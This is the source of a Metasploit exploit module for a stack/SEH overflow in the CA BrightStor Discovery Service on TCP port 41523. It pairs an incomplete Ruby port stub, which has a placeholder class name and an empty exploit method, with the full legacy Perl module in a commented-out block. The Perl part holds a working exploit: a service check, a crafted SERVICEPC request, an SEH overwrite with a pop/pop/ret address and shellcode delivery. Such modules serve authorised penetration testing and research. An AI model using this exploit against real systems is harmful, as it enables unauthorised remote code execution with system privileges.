require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA BrightStor Discovery Service SERVICEPC Overflow',
			'Description'    => %q{
				This module exploits a vulnerability in the CA BrightStor
				Discovery Service. This vulnerability occurs when a specific
				type of request is sent to the TCP listener on port 41523.
				This vulnerability was discovered by cybertronic[at]gmx.net
				and affects all known versions of the BrightStor product.
				This module is based on the 'cabrightstor_disco' exploit by
				Thor Doomen.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '13814'],
					[ 'BID', '12536'],
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2005-02/0123.html'],
					[ 'MIL', '15'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2048,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Feb 14 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cabrightstor_disco_servicepc;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'CA BrightStor Discovery Service SERVICEPC Overflow',
	'Version'  => '$Revision$',
	'Authors'  => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'     => 1,
	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 41523],
	  },

	'Payload' =>
	  {
		'Space'     => 2048,
		'BadChars'  => "\x00",
		'Prepend' => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the CA BrightStor
		Discovery Service. This vulnerability occurs when a specific
		type of request is sent to the TCP listener on port 41523. This
		vulnerability was discovered by cybertronic[at]gmx.net and affects
		all known versions of the BrightStor product. This module is based
		on the 'cabrightstor_disco' exploit by Thor Doomen.
}),

	'Refs'    =>
	  [
		['OSVDB', '13814'],
		['BID',	'12536'],
		['URL', 'http://archives.neohapsis.com/archives/bugtraq/2005-02/0123.html'],
		['MIL', '15'],		
	  ],

	'Targets' =>
	  [
		['cheyprod.dll 12/12/2003', 0x23805714], # pop/pop/ret
	  ],

	'Keys'    => ['brightstor'],

	'DisclosureDate' => 'Feb 14 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	# Connection #1 should not receive a response
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("META");
	my $res = $s->Recv(-1, 1);
	$s->Close;

	if ($res) {
		$self->PrintLine("[*] The discovery returned a strange response: $res");
	}

	# Connection #2 should receive the hostname of the target
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("hMETA");
	my $res = $s->Recv(-1, 1);
	$s->Close;

	if (! $res) {
		$self->PrintLine("[*] The discovery service did not respond to our query");
		return $self->CheckCode('Generic');
	}

	$self->PrintLine("[*] Discovery service active on host: $res");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $poof = Pex::Text::EnglishText(4096);

	# Overwriting the return address works well, but the only register
	# pointing back to our code is 'esp'. The following stub overwrites
	# the SEH frame instead, making things a bit easier.

	substr($poof, 1024, 2, "\xeb\x06");
	substr($poof, 1028, 4, pack('V', $target->[1]));
	substr($poof, 1032, length($shellcode), $shellcode);

	# Make sure the return address is invalid to trigger SEH
	substr($poof, 900, 100, chr(128 + rand()*127) x 100);

	my $bang =
	  "\x9b".
	  "SERVICEPC".
	  "\x18".
	  pack('N', 0x01020304).
	  "SERVICEPC".
	  "\x01\x0c\x6c\x93\xce\x18\x18\x41".
	  $poof;

	$self->PrintLine("[*] Sending " .length($bang) . " bytes to remote host.");
	$s->Send($bang);

	# Closing the socket too early breaks the exploit
	$s->Recv(-1, 5);

	return;
}

1;

=end


end
end	
